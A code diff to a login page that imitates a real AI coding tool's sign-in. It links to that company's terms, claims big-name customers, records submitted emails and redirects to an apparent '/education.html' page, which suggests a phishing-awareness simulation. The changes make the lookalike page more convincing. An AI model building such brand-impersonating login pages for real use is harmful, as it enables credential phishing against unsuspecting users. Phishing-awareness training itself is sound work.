@@ -11,6 +11,7 @@
             --text-light: #f0f6fc;
             --accent-blue: #58a6ff;
             --input-bg: #0d1117;
+            --divider-color: #30363d;
         }
         
         body {
@@ -30,7 +31,7 @@
             padding: 32px;
             width: 320px;
             box-shadow: 0 8px 24px rgba(1, 4, 9, 0.5);
-            border: 1px solid #30363d;
+            border: 1px solid var(--divider-color);
         }
         
         .logo {
@@ -58,23 +59,55 @@
             display: block;
             margin-bottom: 8px;
             font-size: 14px;
+            font-weight: 500;
         }
         
         input {
             width: 100%;
             padding: 12px;
             background-color: var(--input-bg);
-            border: 1px solid #30363d;
+            border: 1px solid var(--divider-color);
             border-radius: 6px;
             color: var(--text-light);
             font-size: 14px;
             box-sizing: border-box;
+            transition: border-color 0.2s;
         }
         
         input:focus {
             outline: none;
             border-color: var(--accent-blue);
             box-shadow: 0 0 0 3px rgba(56, 139, 253, 0.3);
+        }
+        
+        input:invalid {
+            border-color: #f85149;
+        }
+        
+        input:invalid:focus {
+            box-shadow: 0 0 0 3px rgba(248, 81, 73, 0.3);
+        }
+        
+        .password-container {
+            position: relative;
+        }
+        
+        .show-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #8b949e;
+            cursor: pointer;
+            font-size: 12px;
+            padding: 0;
+        }
+        
+        .show-password:hover {
+            color: var(--accent-blue);
+            text-decoration: underline;
         }
         
         button {
@@ -108,7 +141,7 @@
             left: 0;
             right: 0;
             height: 1px;
-            background-color: #30363d;
+            background-color: var(--divider-color);
             z-index: 1;
         }
         
@@ -128,15 +161,17 @@
             padding: 10px;
             margin-bottom: 12px;
             background-color: transparent;
-            border: 1px solid #30363d;
+            border: 1px solid var(--divider-color);
             border-radius: 6px;
             color: var(--text-light);
             font-size: 14px;
             cursor: pointer;
+            transition: background-color 0.2s;
         }
         
         .oauth-btn:hover {
             background-color: rgba(240, 246, 252, 0.1);
+            border-color: #8b949e;
         }
         
         .oauth-btn svg {
@@ -157,11 +192,22 @@
             text-decoration: none;
         }
         
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
         .trusted-by {
             text-align: center;
             margin-bottom: 24px;
             font-size: 12px;
             color: #8b949e;
+        }
+        
+        .error-message {
+            color: #f85149;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
         }
     </style>
 </head>
@@ -180,17 +226,26 @@
             Trusted by developers at Google, Microsoft, OpenAI, and more
         </div>
         
-        <h1>Sign in to Cursor AI</h1>
+        <h1>Sign in</h1>
         
         <form id="login-form">
             <div class="form-group">
                 <label for="email">Email address</label>
-                <input type="email" id="email" name="email" placeholder="your.email@company.com" required autofocus>
+                <input type="email" id="email" name="email" placeholder="your.email@company.com" 
+                       pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$" 
+                       title="Please enter a valid email address" required autofocus>
+                <div class="error-message" id="email-error">Please enter a valid email address</div>
             </div>
             
             <div class="form-group">
                 <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="••••••••" required>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" placeholder="••••••••" 
+                           minlength="8" pattern="^(?=.*[A-Za-z])(?=.*\d).{8,}$" 
+                           title="Password must be at least 8 characters and include both letters and numbers" required>
+                    <button type="button" class="show-password" id="show-password">Show</button>
+                </div>
+                <div class="error-message" id="password-error">Password must be at least 8 characters and include both letters and numbers</div>
             </div>
             
             <button type="submit">Continue</button>
@@ -214,9 +269,16 @@
             Continue with GitHub
         </button>
         
+        <button class="oauth-btn">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M17.05 12.05c0-3.07-2.47-5.55-5.5-5.55s-5.5 2.48-5.5 5.55c0 2.47 1.64 4.55 3.89 5.28v-3.86h-1.71v-2.84h1.71v-1.71c0-1.71 1.04-2.63 2.63-2.63.76 0 1.42.14 1.97.42v2.21h-1.32c-.94 0-1.11.45-1.11 1.11v1.58h2.42l-.35 2.84h-2.07v3.86c2.25-.73 3.89-2.81 3.89-5.28z" fill="#f0f6fc"/>
+            </svg>
+            Continue with Apple
+        </button>
+        
         <div class="footer-links">
-            <p>Don't have an account? <a href="#">Sign up</a></p>
-            <p><a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></p>
+            <p>Don't have an account? <a href="https://cursor.so/" target="_blank">Sign up</a></p>
+            <p><a href="https://cursor.so/terms" target="_blank">Terms of Service</a> and <a href="https://cursor.so/privacy" target="_blank">Privacy Policy</a></p>
         </div>
     </div>
 
@@ -225,6 +287,25 @@
             e.preventDefault();
             
             const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // 验证输入
+            const emailValid = document.getElementById('email').checkValidity();
+            const passwordValid = document.getElementById('password').checkValidity();
+            
+            if (!emailValid) {
+                document.getElementById('email-error').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('email-error').style.display = 'none';
+            }
+            
+            if (!passwordValid) {
+                document.getElementById('password-error').style.display = 'block';
+                return;
+            } else {
+                document.getElementById('password-error').style.display = 'none';
+            }
             
             // 仅发送邮箱到后端记录
             try {
@@ -239,6 +320,33 @@
             
             // 立即跳转教育页面
             window.location.href = '/education.html';
+        });
+        
+        // 显示/隐藏密码功能
+        document.getElementById('show-password').addEventListener('click', () => {
+            const passwordInput = document.getElementById('password');
+            const showButton = document.getElementById('show-password');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                showButton.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                showButton.textContent = 'Show';
+            }
+        });
+        
+        // 实时验证输入
+        document.getElementById('email').addEventListener('input', function() {
+            if (this.checkValidity()) {
+                document.getElementById('email-error').style.display = 'none';
+            }
+        });
+        
+        document.getElementById('password').addEventListener('input', function() {
+            if (this.checkValidity()) {
+                document.getElementById('password-error').style.display = 'none';
+            }
         });
     </script>
 </body>
